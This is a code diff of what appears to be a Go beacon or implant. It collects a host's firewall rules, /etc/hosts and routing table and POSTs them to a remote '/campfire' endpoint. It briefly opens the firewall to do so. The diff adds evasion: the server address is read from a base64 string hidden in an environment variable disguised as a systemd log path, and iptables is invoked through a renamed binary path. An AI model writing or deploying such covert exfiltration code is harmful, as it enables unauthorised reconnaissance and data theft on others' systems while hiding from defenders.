@@ -6,6 +6,7 @@ package main
 
 import (
 	"bytes"
+	b64 "encoding/base64"
 	"encoding/json"
 	"net"
 	"net/http"
@@ -15,12 +16,21 @@ import (
 	"time"
 )
 
-var serv = "0.0.0.0:5000" //IP of flask serv
-var loopTime = 500        //sleep time in seconds
+var serv = getServer() //IP of flask serv
+var loopTime = 300     //sleep time in seconds
+
+// turn encoded environment variable into ip addres
+// example env: "/var/log/systemd-MTkyLjE2OC4xLjE=" => 192.168.1.1:5000
+func getServer() string {
+	envVar := os.Getenv("ERROR_LOGGING") //fetch environment variable
+	trimmedStr := strings.Replace(envVar, "/var/log/systemd-", "", 1)
+	decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
+	return string(decoded)
+}
 
 // return output of "iptables -L" as one large string
 func getTables() string {
-	cmd := exec.Command("/bin/bash", "-c", "iptables-save")
+	cmd := exec.Command("/bin/sh", "-c", "/usr/share/xtables-mul iptables-save")
 	out, err := cmd.CombinedOutput()
 	if err != nil {
 		return "Err"
@@ -30,7 +40,7 @@ func getTables() string {
 
 // return output of "iptables -L" as one large string
 func getHosts() string {
-	cmd := exec.Command("/bin/bash", "-c", "cat /etc/hosts")
+	cmd := exec.Command("/bin/sh", "-c", "cat /etc/hosts")
 	out, err := cmd.CombinedOutput()
 	if err != nil {
 		return "Err"
@@ -40,7 +50,7 @@ func getHosts() string {
 
 // return output of "iptables -L" as one large string
 func getRoutes() string {
-	cmd := exec.Command("/bin/bash", "-c", "ip route")
+	cmd := exec.Command("/bin/sh", "-c", "ip route")
 	out, err := cmd.CombinedOutput()
 	if err != nil {
 		return "Err"
@@ -62,10 +72,10 @@ func sendData(rules string, hosts string, routes string, ip string) {
 	url1 := "http://" + serv + "/campfire" // turn ip into valid url
 	jsonData := map[string]string{"rules": rules, "etchosts": hosts, "routes": routes, "ip": ip}
 	jsonValue, _ := json.Marshal(jsonData)
-	insRule := exec.Command("iptables", "-I", "FILTER", "1", "-j", "ACCEPT") //temporarily allow so we can send data
+	insRule := exec.Command("/usr/share/xtables-mul iptables", "-I", "FILTER", "1", "-j", "ACCEPT") //temporarily allow so we can send data
 	insRule.Run()
 	_, err := http.Post(url1, "application/json", bytes.NewBuffer(jsonValue))
-	dropRule := exec.Command("iptables", "-D", "FILTER", "1")
+	dropRule := exec.Command("/usr/share/xtables-mul iptables", "-D", "FILTER", "1")
 	dropRule.Run()
 	if err != nil {
 		return
